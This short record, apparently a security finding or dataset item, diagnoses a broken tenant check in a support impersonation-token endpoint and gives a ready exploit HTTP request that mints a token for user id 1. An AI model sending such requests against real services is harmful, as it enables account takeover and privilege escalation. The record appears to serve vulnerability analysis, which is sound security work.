diagnosis: The support token generation endpoint verifies that the caller has the SupportAgent group, but fails to check whether target_user belongs to the vendor account or tenant tier assigned to the agent. An external tiered support contractor can mint full access tokens for enterprise superusers or users in other partner tenants.
exploit_request:
POST /api/support/generate-impersonation-token/ HTTP/1.1
Host: helpdesk.cloudcore.com
Authorization: Bearer <contractor_support_jwt>
Content-Type: application/json

{"target_user_id": 1}
